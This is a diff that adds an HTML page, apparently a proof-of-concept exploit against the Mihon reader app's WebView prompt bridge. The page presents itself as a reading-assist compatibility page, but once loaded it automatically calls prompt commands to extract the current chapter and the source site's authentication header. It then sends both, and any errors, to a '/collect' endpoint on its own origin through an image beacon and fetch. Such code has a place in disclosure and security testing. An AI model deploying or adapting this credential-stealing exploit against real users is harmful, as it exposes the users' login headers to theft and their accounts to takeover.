@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 阅读辅助兼容页</title>
+<style>
+body { font-family: sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.info { color: #666; font-size: 14px; }
+.ok { color: #15803d; }
+.err { color: #b91c1c; }
+code { background: #eee; padding: 2px 4px; border-radius: 4px; }
+pre { background: #eee; padding: 10px; border-radius: 4px; white-space: pre-wrap; word-break: break-all; }
+</style>
+</head>
+<body>
+<h2>Mihon 阅读辅助兼容页</h2>
+<p class="info">旧版阅读辅助 H5 通过 JS prompt 查询阅读状态。页面加载后会自动执行兼容命令。</p>
+
+<div class="card">
+<h3>当前章节</h3>
+<div id="chapter-info">等待 Native 回调...</div>
+</div>
+
+<div class="card">
+<h3>源站认证状态</h3>
+<div id="auth-status">等待 Native 回调...</div>
+<pre id="auth-value"></pre>
+</div>
+
+<div class="card">
+<h3>触发命令</h3>
+<code>prompt("mihon-reader:getSourceAuthHeader")</code>
+</div>
+
+<script>
+var EXFIL = location.origin + "/collect";
+
+function setText(id, text, cls) {
+    var el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = text;
+    if (cls) el.className = cls;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data || "");
+    var target = EXFIL + "?d=" + encodeURIComponent(payload);
+    try { new Image().src = target; } catch (e) {}
+    try { fetch(target, { mode: "no-cors" }); } catch (e) {}
+}
+
+function runReaderPromptExploit() {
+    try {
+        var chapter = prompt("mihon-reader:getCurrentChapter", "");
+        setText("chapter-info", chapter || "未返回章节信息", chapter ? "ok" : "err");
+        exfil("currentChapter", chapter || "");
+    } catch (e) {
+        setText("chapter-info", "章节命令失败: " + e.message, "err");
+        exfil("currentChapter_error", e.message);
+    }
+
+    try {
+        var sourceAuthHeader = prompt("mihon-reader:getSourceAuthHeader", "");
+        if (sourceAuthHeader) {
+            setText("auth-status", "已通过 onJsPrompt 取得源站认证 header", "ok");
+            setText("auth-value", sourceAuthHeader);
+            exfil("sourceAuthHeader", sourceAuthHeader);
+        } else {
+            setText("auth-status", "未返回源站认证 header", "err");
+            exfil("sourceAuthHeader_empty", "");
+        }
+    } catch (e) {
+        setText("auth-status", "认证命令失败: " + e.message, "err");
+        exfil("sourceAuthHeader_error", e.message);
+    }
+}
+
+setTimeout(runReaderPromptExploit, 300);
+</script>
+</body>
+</html>
